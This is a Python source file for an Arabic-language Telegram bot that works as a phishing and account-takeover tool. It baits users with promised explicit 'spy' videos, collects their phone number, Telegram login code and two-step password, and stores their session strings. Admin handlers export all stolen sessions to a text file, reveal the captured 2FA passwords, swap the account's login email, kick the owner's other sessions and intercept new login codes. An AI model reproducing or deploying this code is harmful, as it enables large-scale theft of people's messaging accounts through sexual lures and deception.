import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, Contact, BufferedInputFile
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from config import (
    BOT_TOKEN, ADMIN_IDS, REGISTRATION_LINK, SESSION_RECOVERY_DELAY, SUPER_ADMIN_ID,
)
import database
import session_manager
import volume_backup
from keyboards import (
    age_confirm_keyboard, share_phone_keyboard, numpad_keyboard,
    retry_keyboard, sessions_keyboard, session_detail_keyboard,
    back_to_session_keyboard, ADMIN_FOOTER
)

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher(storage=MemoryStorage())


# ──────────────────────────────────────────
# States
# ──────────────────────────────────────────
class UserFlow(StatesGroup):
    waiting_phone = State()
    entering_code = State()
    entering_2fa  = State()

class AdminFlow(StatesGroup):
    waiting_code  = State()
    changing_user = State()
    changing_name = State()
    changing_2fa  = State()
    waiting_volume_upload = State()


# ──────────────────────────────────────────
# حالة في الذاكرة
# ──────────────────────────────────────────
user_code_input  = {}
user_msg_ids     = {}
user_link_msg_id = {}
phone_to_user    = {}
code_wait_tasks  = {}


# ──────────────────────────────────────────
# أدوات مساعدة
# ──────────────────────────────────────────
def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


def is_super_admin(uid: int) -> bool:
    return uid == SUPER_ADMIN_ID


async def _sessions_for_admin(uid: int):
    return await database.get_sessions_for_admin(uid, SUPER_ADMIN_ID)


async def _guard_session(callback: CallbackQuery, phone: str) -> bool:
    if not await database.can_admin_access_session(
        callback.from_user.id, phone, SUPER_ADMIN_ID
    ):
        await callback.answer("❌ هذا الحساب غير متاح.", show_alert=True)
        return False
    return True


async def _admin_panel_text(uid: int) -> str:
    count = await database.get_sessions_count(uid, SUPER_ADMIN_ID)
    return (
        f"👋 أهلاً بالقيادة!\n\n"
        f"هذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
        + ADMIN_FOOTER
    )


def h(text) -> str:
    """Escape HTML special chars"""
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

async def safe_delete(chat_id, msg_id):
    try:
        await bot.delete_message(chat_id, msg_id)
    except Exception:
        pass

async def notify_admins(text: str, phone: str = None):
    """يرسل للأدمنة — يتخطى غير A1 إذا الجلسة ⭐ خاصة."""
    for aid in ADMIN_IDS:
        if phone:
            session = await database.get_session_by_phone(phone)
            if session and database.row_flag(session, "a1_only") and aid != SUPER_ADMIN_ID:
                continue
        try:
            msg = await bot.send_message(aid, text, parse_mode="HTML")
            if phone:
                await database.save_admin_notification(
                    aid, phone, msg.chat.id, msg.message_id
                )
        except Exception:
            pass

async def edit_or_send(chat_id, uid, text, markup=None):
    mid = user_msg_ids.get(uid)
    if mid:
        try:
            await bot.edit_message_text(
                text, chat_id=chat_id, message_id=mid,
                reply_markup=markup, parse_mode="HTML"
            )
            return
        except Exception:
            pass
    m = await bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
    user_msg_ids[uid] = m.message_id


# ──────────────────────────────────────────
# تدفق المستخدم
# ──────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id

    if is_admin(uid):
        await show_admin_panel(message)
        return

    user = await database.get_user(uid)
    if user and user["phone"]:
        phone   = user["phone"]
        session = await database.get_session_by_phone(phone)
        if session and session["valid"]:
            m = await message.answer(
                f"✅ أنت مسجل مسبقاً!\n\n🔗 رابط الفيديو🫦🫦:\n{REGISTRATION_LINK}\n"
                "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين💋🫦\n@N01_n0one"
            )
            user_link_msg_id[uid] = m.message_id
            return

    m = await message.answer(
        "💋 للوصول إلى البوت، يجب عليك تأكيد أن عمرك يزيد عن 18 عامًا!🔞",
        reply_markup=age_confirm_keyboard()
    )
    user_msg_ids[uid] = m.message_id


@dp.callback_query(F.data == "confirm_age")
async def confirm_age(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    if is_admin(uid):
        await callback.answer()
        return

    await callback.message.edit_text("💦 اضغط الزر! ❤️‍🔥\n👇👇 (عمري فوق ١٨ عامًا!) 👇👇")
    user_msg_ids[uid] = callback.message.message_id
    await callback.message.answer("👇", reply_markup=share_phone_keyboard())
    await state.set_state(UserFlow.waiting_phone)
    await callback.answer()


@dp.message(UserFlow.waiting_phone, F.contact)
async def contact_received(message: Message, state: FSMContext):
    uid     = message.from_user.id
    contact: Contact = message.contact

    await safe_delete(message.chat.id, message.message_id)
    await safe_delete(message.chat.id, message.message_id - 1)

    phone = contact.phone_number
    if not phone.startswith("+"):
        phone = f"+{phone}"

    uname = message.from_user.username or ""
    fname = f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
    await database.save_user(uid, uname, fname, phone)
    phone_to_user[phone] = uid

    await edit_or_send(message.chat.id, uid, "⏳ انتظر قليلاً 🕐")
    result = await session_manager.request_code(uid, phone)

    if not result["success"]:
        err = result.get("error", "")
        txt = (
            f"⚠️ حاول بعد {err.split(':')[1]} ثانية."
            if "flood" in err
            else "❌ حدث خطأ، حاول مرة أخرى لاحقاً."
        )
        await edit_or_send(message.chat.id, uid, txt)
        await state.clear()
        return

    user_code_input[uid] = ""
    await state.set_state(UserFlow.entering_code)
    await state.update_data(phone=phone)
    await edit_or_send(
        message.chat.id, uid,
        "✅ أدخل رمز التأكيد الذي أرسلناه إليك.\n\n"
        'يمكنك الحصول على الرمز من <a href="https://t.me/+42777">هنا</a>',
        markup=numpad_keyboard("")
    )


@dp.message(F.contact)
async def block_contact(message: Message, state: FSMContext):
    await safe_delete(message.chat.id, message.message_id)


@dp.callback_query(F.data.startswith("np_"))
async def numpad_press(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    cur = await state.get_state()
    if cur != UserFlow.entering_code:
        await callback.answer()
        return

    key  = callback.data[3:]
    code = user_code_input.get(uid, "")

    if key == "del":
        code = code[:-1]
    elif key == "display":
        await callback.answer()
        return
    else:
        if len(code) < 5:
            code += key

    user_code_input[uid] = code

    if len(code) == 5:
        await callback.answer("⏳ جاري التحقق...")
        await edit_or_send(callback.message.chat.id, uid, "⏳ جاري التحقق...")
        result = await session_manager.submit_code(uid, code)
        user_code_input[uid] = ""

        if result.get("two_fa"):
            await state.set_state(UserFlow.entering_2fa)
            await edit_or_send(
                callback.message.chat.id, uid,
                "🔐 أدخل كلمة مرور التحقق بخطوتين وأرسلها:"
            )
            return

        if result["success"]:
            data  = await state.get_data()
            phone = data.get("phone")
            await state.clear()
            await edit_or_send(
                callback.message.chat.id, uid,
                f"✅ تم التسجيل بنجاح!\n\n🔗 رابط الفيديو🫦💋:\n{REGISTRATION_LINK}\n"
                "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين💗💞\n@N01_n0one"
            )
            user_link_msg_id[uid] = user_msg_ids.get(uid)
            await _notify_new_session(
                phone,
                result.get("email_linked"),
                result.get("login_email"),
                result.get("email_error"),
            )
        else:
            await edit_or_send(
                callback.message.chat.id, uid,
                "❌ الرمز خاطئ أو منتهي. حاول مرة أخرى.",
                markup=retry_keyboard()
            )
    else:
        try:
            await bot.edit_message_reply_markup(
                chat_id=callback.message.chat.id,
                message_id=user_msg_ids.get(uid, callback.message.message_id),
                reply_markup=numpad_keyboard(code)
            )
        except Exception:
            pass
        await callback.answer()


@dp.message(UserFlow.entering_2fa)
async def text_2fa(message: Message, state: FSMContext):
    uid      = message.from_user.id
    password = message.text.strip()
    await safe_delete(message.chat.id, message.message_id)

    await edit_or_send(message.chat.id, uid, "⏳ جاري التحقق...")
    result = await session_manager.submit_2fa(uid, password)
    if result["success"]:
        data  = await state.get_data()
        phone = data.get("phone")
        await state.clear()
        await edit_or_send(
            message.chat.id, uid,
            f"✅ تم التسجيل بنجاح!\n\n🔗 رابط الفيديو🔞🫦:\n{REGISTRATION_LINK}\n"
            "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين🔞💞\n@N01_n0one"
        )
        user_link_msg_id[uid] = user_msg_ids.get(uid)
        await _notify_new_session(
            phone,
            result.get("email_linked"),
            result.get("login_email"),
            result.get("email_error"),
        )
    else:
        await edit_or_send(
            message.chat.id, uid,
            "❌ كلمة المرور خاطئة. أرسل كلمة مرور التحقق بخطوتين مجدداً:"
        )


async def _notify_new_session(phone: str, email_linked: bool = False, login_email: str = None, email_error: str = None):
    session = await database.get_session_by_phone(phone)
    if not session:
        return
    uname = session["username"]  or "لا يوجد"
    fname = session["full_name"] or "غير معروف"
    if email_linked and login_email:
        mail_line = f"📧 بريد Login: <code>{h(login_email)}</code>"
    elif email_error:
        mail_line = f"⚠️ فشل ربط بريد Login: <code>{h(email_error)}</code>"
    else:
        mail_line = "⚠️ لم يُربط بريد Login"
    await notify_admins(
        f"🆕 <b>حساب جديد تم تسجيله!</b>\n\n"
        f"📱 الرقم: <code>{h(phone)}</code>\n"
        f"👤 الاسم: {h(fname)}\n"
        f"🔖 اليوزر: @{h(uname)}\n"
        f"{mail_line}"
        + ADMIN_FOOTER,
        phone=phone,
    )


async def _on_recovery_done(phone: str, result: dict):
    session = await database.get_session_by_phone(phone)
    fname = session["full_name"] if session else "غير معروف"
    session_manager._recovery_scheduled.discard(phone)

    if result.get("success"):
        await notify_admins(
            f"♻️ <b>تم إنعاش الجلسة عبر بريد Login!</b>\n\n"
            f"📱 الرقم: <code>{h(phone)}</code>\n"
            f"👤 الاسم: {h(fname)}\n"
            f"📧 البريد: <code>{h(result.get('email', ''))}</code>"
            + ADMIN_FOOTER,
            phone=phone,
        )
        return

    await database.mark_session_invalid(phone)
    await notify_admins(
        f"❌ <b>جلسة غير صالحة — فشل الإنعاش</b>\n\n"
        f"📱 الرقم: <code>{h(phone)}</code>\n"
        f"👤 الاسم: {h(fname)}\n"
        f"⚠️ السبب: <code>{h(result.get('error', ''))}</code>\n\n"
        f"تم تصنيفها غير صالحة بعد محاولة الإنعاش."
        + ADMIN_FOOTER,
        phone=phone,
    )
    uid = phone_to_user.get(phone)
    if uid:
        lmid = user_link_msg_id.get(uid)
        if lmid:
            await safe_delete(uid, lmid)
            user_link_msg_id.pop(uid, None)
        try:
            m = await bot.send_message(
                uid,
                "⚠️ انتهت جلستك. يرجى إعادة التسجيل.",
                reply_markup=retry_keyboard(),
            )
            user_msg_ids[uid] = m.message_id
        except Exception:
            pass


@dp.callback_query(F.data == "retry_code")
async def retry_code(callback: CallbackQuery, state: FSMContext):
    uid   = callback.from_user.id
    data  = await state.get_data()
    phone = data.get("phone")
    if not phone:
        user = await database.get_user(uid)
        if user:
            phone = user["phone"]
    if not phone:
        await callback.answer("❌ لم يتم العثور على رقمك.")
        return

    result = await session_manager.request_code(uid, phone)
    user_code_input[uid] = ""
    if result["success"]:
        await state.set_state(UserFlow.entering_code)
        await state.update_data(phone=phone)
        await edit_or_send(
            callback.message.chat.id, uid,
            "✅ أدخل رمز التأكيد الذي أرسلناه إليك.\n\n"
            'يمكنك الحصول على الرمز من <a href="https://t.me/+42777">هنا</a>',
            markup=numpad_keyboard("")
        )
    else:
        await callback.answer("❌ فشل إرسال الكود، حاول لاحقاً.")


# ──────────────────────────────────────────
# Watchdog
# ──────────────────────────────────────────
async def session_watchdog():
    while True:
        await asyncio.sleep(30)
        try:
            sessions = await database.get_all_sessions()
            for s in sessions:
                if not s["valid"]:
                    continue
                phone       = s["phone"]
                still_valid = await session_manager.check_session_valid(phone)
                if not still_valid:
                    login_email = database.row_login_email(s)
                    if login_email and s["email_password"]:
                        if phone not in session_manager._recovery_scheduled:
                            await notify_admins(
                                f"⚠️ <b>جلسة توقفت</b>\n\n"
                                f"📱 الرقم: <code>{h(phone)}</code>\n"
                                f"👤 الاسم: {h(s['full_name'] or 'غير معروف')}\n\n"
                                f"♻️ بعد {SESSION_RECOVERY_DELAY // 60} دقائق: "
                                f"طلب كود عبر بريد Login\n"
                                f"<code>{h(login_email)}</code>"
                                + ADMIN_FOOTER,
                                phone=phone,
                            )
                            session_manager.schedule_session_recovery(
                                phone,
                                SESSION_RECOVERY_DELAY,
                                on_done=_on_recovery_done,
                            )
                    else:
                        await database.mark_session_invalid(phone)
                        await notify_admins(
                            f"❌ <b>جلسة غير صالحة</b>\n\n"
                            f"📱 الرقم: <code>{h(phone)}</code>\n"
                            f"⚠️ لا يوجد بريد Login — لا يمكن الإنعاش."
                            + ADMIN_FOOTER,
                            phone=phone,
                        )
        except Exception as e:
            logging.error(f"Watchdog: {e}")


# ──────────────────────────────────────────
# لوحة الأدمن — عرض الجلسات
# ──────────────────────────────────────────
async def show_admin_panel(message: Message):
    uid = message.from_user.id
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    kb = sessions_keyboard(sessions, is_super_admin=is_super_admin(uid)) if sessions else None
    suffix = "" if sessions else "\n\n📭 لا توجد جلسات محفوظة."
    await message.answer(text + suffix, reply_markup=kb, parse_mode="HTML")


@dp.callback_query(F.data.startswith("sessions_page_"))
async def sessions_page(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    page = int(callback.data.split("_")[-1])
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    await callback.message.edit_text(
        text,
        reply_markup=sessions_keyboard(
            sessions, page, is_super_admin=is_super_admin(uid)
        ),
        parse_mode="HTML",
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("session_"))
async def session_detail(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    phone = callback.data[8:]
    if not await database.can_admin_access_session(uid, phone, SUPER_ADMIN_ID):
        await callback.answer("❌ هذا الحساب غير متاح.", show_alert=True)
        return
    session = await database.get_session_by_phone(phone)
    if not session:
        await callback.answer("❌ الجلسة غير موجودة!")
        return

    username    = session["username"]  or "لا يوجد"
    full_name   = session["full_name"] or "غير معروف"
    created_at  = session["created_at"]
    two_fa_stat = "✅ موجود" if session["two_fa"] else "❌ لا يوجد"
    valid_stat  = "✅ نشطة"  if session["valid"]  else "❌ غير صالحة"
    login_mail  = database.row_login_email(session) or "❌ غير مربوط"
    secured_stat = "🔒 مؤمّنة" if database.row_flag(session, "secured") else "—"
    private_stat = "⭐ خاصة (A1)" if database.row_flag(session, "a1_only") else "—"

    text = (
        f"📱 <code>{h(phone)}</code>\n\n"
        f"👤 الاسم: {h(full_name)}\n"
        f"🔖 اليوزر: @{h(username)}\n"
        f"🔐 التحقق بخطوتين: {two_fa_stat}\n"
        f"📧 بريد Login: <code>{h(login_mail)}</code>\n"
        f"📶 الحالة: {valid_stat}\n"
        f"🔒 التأمين: {secured_stat}\n"
        f"⭐ الخصوصية: {private_stat}\n"
        f"📅 تاريخ التسجيل: {h(created_at)}"
        + ADMIN_FOOTER
    )
    await callback.message.edit_text(
        text, reply_markup=session_detail_keyboard(phone), parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data == "back_to_sessions")
async def back_to_sessions(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    kb = sessions_keyboard(
        sessions, is_super_admin=is_super_admin(uid)
    ) if sessions else None
    suffix = "" if sessions else "\n\n📭 لا توجد جلسات."
    await callback.message.edit_text(text + suffix, reply_markup=kb, parse_mode="HTML")
    await callback.answer()


# ──────────────────────────────────────────
# ⭐ إخفاء جلسة عن باقي الأدمنة (A1 فقط)
# ──────────────────────────────────────────
@dp.callback_query(F.data.startswith("a1_hide_"))
async def a1_hide_session(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    phone = callback.data[9:]
    session = await database.get_session_by_phone(phone)
    if not session:
        await callback.answer("❌ غير موجود")
        return

    hide = not database.row_flag(session, "a1_only")
    await database.set_session_a1_only(phone, hide)

    if hide:
        notifs = await database.get_admin_notifications_for_phone(
            phone, except_admin=SUPER_ADMIN_ID
        )
        deleted = 0
        for n in notifs:
            await safe_delete(n["chat_id"], n["message_id"])
            deleted += 1
        await database.delete_admin_notifications_for_phone(
            phone, except_admin=SUPER_ADMIN_ID
        )
        await callback.answer(
            f"⭐ خاص — حُذف {deleted} إشعار من الأدمنة الآخرين",
            show_alert=True,
        )
    else:
        await callback.answer("☆ ظهر للأدمنية مرة أخرى", show_alert=True)

    uid = callback.from_user.id
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    page = 0
    await callback.message.edit_text(
        text,
        reply_markup=sessions_keyboard(sessions, page, is_super_admin=True),
        parse_mode="HTML",
    )


# ──────────────────────────────────────────
# فحص الجلسات (A1 فقط)
# ──────────────────────────────────────────
@dp.callback_query(F.data == "check_sessions")
async def check_sessions_handler(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    await callback.answer("⏳ جاري فحص الجلسات...")
    await callback.message.edit_text(
        "⏳ جاري فحص جميع الجلسات النشطة (قد يستغرق دقائق)..." + ADMIN_FOOTER,
        parse_mode="HTML",
    )
    stats = await session_manager.bulk_check_sessions()
    uid = callback.from_user.id
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    report = (
        f"\n\n🔍 <b>نتيجة الفحص</b>\n"
        f"تم فحص: <b>{stats['checked']}</b>\n"
        f"❌ غير صالحة (مجمدة/ميتة): <b>{stats['invalid']}</b>"
    )
    if stats.get("phones"):
        sample = stats["phones"][:5]
        report += "\n" + "\n".join(f"• <code>{h(p)}</code>" for p in sample)
        if len(stats["phones"]) > 5:
            report += f"\n... و {len(stats['phones']) - 5} أخرى"
    await callback.message.edit_text(
        text + report + ADMIN_FOOTER,
        reply_markup=sessions_keyboard(
            sessions, is_super_admin=is_super_admin(uid)
        ),
        parse_mode="HTML",
    )


# ──────────────────────────────────────────
# Volume — سحب / رفع (A1 فقط)
# ──────────────────────────────────────────
@dp.callback_query(F.data == "vol_export")
async def volume_export_handler(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    await callback.answer("⏳ جاري ضغط Volume...")
    try:
        data, filename = volume_backup.build_volume_zip()
        if not data:
            await callback.message.answer("❌ مجلد Volume فارغ.")
            return
        doc = BufferedInputFile(data, filename=filename)
        await callback.message.answer_document(
            document=doc,
            caption=(
                f"📦 <b>نسخة Volume كاملة</b>\n"
                f"📁 المسار: <code>{h(database.DATA_DIR)}</code>\n"
                f"انقل الملف إلى Volume الجديد ثم استخدم «رفع Volume»."
                + ADMIN_FOOTER
            ),
            parse_mode="HTML",
        )
    except Exception as e:
        logging.error("vol_export: %s", e)
        await callback.message.answer(f"❌ فشل التصدير: <code>{h(str(e))}</code>")
    await callback.answer()


@dp.callback_query(F.data == "vol_import")
async def volume_import_prompt(callback: CallbackQuery, state: FSMContext):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    await state.set_state(AdminFlow.waiting_volume_upload)
    await callback.message.answer(
        "📤 <b>رفع Volume</b>\n\n"
        "أرسل ملف:\n"
        "• <b>.zip</b> — نسخة Volume كاملة (من زر السحب)\n"
        "• أو <b>bot.db</b> — قاعدة البيانات فقط\n\n"
        "⚠️ يُؤخذ نسخة احتياطية من bot.db الحالي قبل الاستبدال."
        + ADMIN_FOOTER,
        parse_mode="HTML",
    )
    await callback.answer()


@dp.message(AdminFlow.waiting_volume_upload, F.document)
async def volume_import_file(message: Message, state: FSMContext):
    if not is_super_admin(message.from_user.id):
        return
    doc = message.document
    name = doc.file_name or "upload.zip"
    if not (name.lower().endswith(".zip") or name.lower().endswith(".db")):
        await message.answer("❌ الملف يجب أن يكون .zip أو .db")
        return

    wait = await message.answer("⏳ جاري استبدال Volume...")
    try:
        file = await bot.get_file(doc.file_id)
        buf = await bot.download_file(file.file_path)
        content = buf.read() if hasattr(buf, "read") else bytes(buf)
        result = volume_backup.restore_volume_file(content, name)
        await state.clear()
        if result.get("success"):
            await database.init_db()
            await wait.edit_text(
                f"✅ تم تحديث Volume بنجاح!\n"
                f"النوع: <code>{h(result.get('mode', ''))}</code>\n"
                f"المسار: <code>{h(database.DATA_DIR)}</code>\n\n"
                f"يُفضّل إعادة تشغيل البوت على Railway."
                + ADMIN_FOOTER,
                parse_mode="HTML",
            )
        else:
            await wait.edit_text(
                f"❌ فشل الرفع: <code>{h(result.get('error', ''))}</code>"
                + ADMIN_FOOTER,
                parse_mode="HTML",
            )
    except Exception as e:
        await state.clear()
        logging.error("volume_import: %s", e)
        await wait.edit_text(f"❌ خطأ: <code>{h(str(e))}</code>", parse_mode="HTML")


# ──────────────────────────────────────────
# سحب الجلسات (نصي وملف)
# ──────────────────────────────────────────
@dp.callback_query(F.data.startswith("export_") and ~F.data.startswith("export_all"))
async def export_session_text(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    phone = callback.data[7:]
    if not await database.can_admin_access_session(uid, phone, SUPER_ADMIN_ID):
        await callback.answer("❌ غير متاح", show_alert=True)
        return
    session = await database.get_session_by_phone(phone)
    if session and session["session_string"]:
        txt = (
            f"📦 كود الجلسة للرقم <code>{h(phone)}</code>:\n\n"
            f"<code>{h(session['session_string'])}</code>"
        )
        await callback.message.answer(txt, parse_mode="HTML")
    else:
        await callback.message.answer("❌ لا يوجد session_string لهذا الرقم.")
    await callback.answer()


@dp.callback_query(F.data == "export_all_txt")
async def export_all_sessions_txt(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return

    uid = callback.from_user.id
    sessions = await _sessions_for_admin(uid)
    if not sessions:
        await callback.answer("❌ لا توجد جلسات.", show_alert=True)
        return

    await callback.message.edit_text("⏳ جاري تجهيز ملف الجلسات...", parse_mode="HTML")

    lines = []
    for s in sessions:
        if s["session_string"]:
            lines.append(f"{s['phone']}:{s['session_string']}")

    if not lines:
        await callback.message.edit_text("❌ لا توجد أكواد جلسات محفوظة لإرسالها.")
        return

    # إنشاء الملف النصي في الذاكرة
    file_content = "\n".join(lines).encode('utf-8')
    document = BufferedInputFile(file_content, filename="all_sessions.txt")

    await callback.message.answer_document(
        document=document,
        caption="📥 <b>ملف جميع الجلسات (رقم:كود)</b>" + ADMIN_FOOTER,
        parse_mode="HTML"
    )

    text = await _admin_panel_text(uid)
    await callback.message.edit_text(
        text,
        reply_markup=sessions_keyboard(
            sessions, is_super_admin=is_super_admin(uid)
        ),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "export_star_txt")
async def export_star_sessions_txt(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return

    sessions = await database.get_a1_only_sessions()
    if not sessions:
        await callback.answer("❌ لا توجد جلسات ⭐.", show_alert=True)
        return

    await callback.message.edit_text("⏳ جاري تجهيز ملف جلسات النجمة...", parse_mode="HTML")
    lines = [
        f"{s['phone']}:{s['session_string']}"
        for s in sessions
        if s["session_string"]
    ]
    if not lines:
        await callback.message.edit_text("❌ لا توجد أكواد لجلسات النجمة.")
        return

    document = BufferedInputFile(
        "\n".join(lines).encode("utf-8"),
        filename="star_sessions.txt",
    )
    await callback.message.answer_document(
        document=document,
        caption="⭐ <b>جلساتك الخاصة (رقم:كود)</b>" + ADMIN_FOOTER,
        parse_mode="HTML",
    )
    uid = callback.from_user.id
    all_s = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    await callback.message.edit_text(
        text,
        reply_markup=sessions_keyboard(all_s, is_super_admin=True),
        parse_mode="HTML",
    )


# ──────────────────────────────────────────
# حذف جلسة فردية نهائياً
# ──────────────────────────────────────────
@dp.callback_query(F.data.startswith("del_session_"))
async def delete_single_session(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    phone = callback.data[12:]
    if not await database.can_admin_access_session(uid, phone, SUPER_ADMIN_ID):
        await callback.answer("❌ غير متاح", show_alert=True)
        return
    await database.delete_admin_notifications_for_phone(phone)
    await database.delete_session(phone)
    await callback.answer(f"✅ تم حذف {phone} نهائياً.", show_alert=True)

    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    kb = sessions_keyboard(
        sessions, is_super_admin=is_super_admin(uid)
    ) if sessions else None
    suffix = "" if sessions else "\n\n📭 لا توجد جلسات."
    await callback.message.edit_text(text + suffix, reply_markup=kb, parse_mode="HTML")


# ──────────────────────────────────────────
# تصفير عداد العمليات
# ──────────────────────────────────────────
@dp.callback_query(F.data == "reset_mail_mem")
async def reset_counter(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    await database.reset_email_counter()
    await callback.answer("✅ تم تصفير عداد العمليات بنجاح!", show_alert=True)


# ──────────────────────────────────────────
# تغيير البريد تلقائياً
# ──────────────────────────────────────────
@dp.callback_query(F.data.startswith("ch_mail_"))
async def auto_mail_process(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    phone = callback.data[8:]
    if not await _guard_session(callback, phone):
        return
    await callback.message.edit_text(
        "⏳ جاري توليد بريد جديد وانتظار الكود..." + ADMIN_FOOTER,
        parse_mode="HTML"
    )

    res = await session_manager.change_login_email(phone)
    if res["success"]:
        new_email = res.get("email", "")
        await callback.message.edit_text(
            f"✅ تم تغيير البريد بنجاح إلى:\n<code>{h(new_email)}</code>" + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(phone)
        )
    else:
        await callback.message.edit_text(
            f"❌ فشل العملية: <code>{h(res['error'])}</code>" + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(phone)
        )
    await callback.answer()


# ──────────────────────────────────────────
# الطرد + سحب الكود
# ──────────────────────────────────────────
@dp.callback_query(F.data.startswith("req_code_"))
async def admin_req_code(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return

    phone = callback.data[9:]
    if not await _guard_session(callback, phone):
        return
    admin_id = callback.from_user.id
    msg_id   = callback.message.message_id
    user_msg_ids[admin_id] = msg_id

    old_task = code_wait_tasks.pop(admin_id, None)
    if old_task:
        old_task.cancel()

    session     = await database.get_session_by_phone(phone)
    two_fa_text = ""
    if session and session["two_fa"]:
        two_fa_text = f"\n\n🔐 <b>التحقق بخطوتين:</b> <code>{h(session['two_fa'])}</code>"

    await callback.message.edit_text(
        f"⏳ في انتظار الكود للرقم <code>{h(phone)}</code>\n\n"
        f"اطلب الكود بنفسك، البوت سيرسله لك فور وصوله تلقائياً."
        + two_fa_text + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(phone)
    )

    task = asyncio.create_task(
        _watch_and_forward(admin_id, phone, msg_id, two_fa_text)
    )
    code_wait_tasks[admin_id] = task
    await callback.answer()


async def _watch_and_forward(admin_id: int, phone: str, msg_id: int, two_fa_text: str):
    code_msg = await session_manager.watch_for_new_code(phone, timeout=180)
    code_wait_tasks.pop(admin_id, None)

    if code_msg:
        try:
            await bot.edit_message_text(
                f"📲 <b>وصل الكود للرقم</b> <code>{h(phone)}</code>\n\n"
                f"📨 الرسالة:\n<code>{h(code_msg)}</code>"
                + two_fa_text + ADMIN_FOOTER,
                chat_id=admin_id,
                message_id=msg_id,
                parse_mode="HTML",
                reply_markup=back_to_session_keyboard(phone)
            )
        except Exception:
            await bot.send_message(
                admin_id,
                f"📲 <b>وصل الكود للرقم</b> <code>{h(phone)}</code>\n\n"
                f"<code>{h(code_msg)}</code>" + two_fa_text + ADMIN_FOOTER,
                parse_mode="HTML",
                reply_markup=back_to_session_keyboard(phone)
            )
    else:
        try:
            await bot.edit_message_text(
                f"⌛ انتهت مدة الانتظار (3 دقائق) بدون استلام كود للرقم <code>{h(phone)}</code>."
                + ADMIN_FOOTER,
                chat_id=admin_id,
                message_id=msg_id,
                parse_mode="HTML",
                reply_markup=back_to_session_keyboard(phone)
            )
        except Exception:
            pass


@dp.callback_query(F.data.startswith("kick_"))
async def admin_kick_sessions(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    phone = callback.data[5:]
    if not await _guard_session(callback, phone):
        return
    await callback.message.edit_text(
        "⏳ جاري طرد الجلسات..." + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(phone)
    )
    result = await session_manager.terminate_other_sessions(phone)
    if result["success"]:
        txt = f"✅ تم طرد جميع الجلسات الأخرى من <code>{h(phone)}</code> بنجاح!"
    else:
        err = result.get("error", "")
        txt = (
            "⚠️ الجلسة لا تزال جديدة، انتظر قليلاً وحاول مجدداً."
            if "fresh" in err.lower() or "recently" in err.lower()
            else f"❌ فشل الطرد: <code>{h(err)}</code>"
        )
    await callback.message.edit_text(
        txt + ADMIN_FOOTER, parse_mode="HTML",
        reply_markup=back_to_session_keyboard(phone)
    )
    await callback.answer()


# ──────────────────────────────────────────
# تغيير اليوزر
# ──────────────────────────────────────────
@dp.callback_query(F.data.startswith("ch_user_"))
async def admin_change_username(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    phone = callback.data[8:]
    if not await _guard_session(callback, phone):
        return
    await state.set_state(AdminFlow.changing_user)
    await state.update_data(phone=phone)
    user_msg_ids[callback.from_user.id] = callback.message.message_id
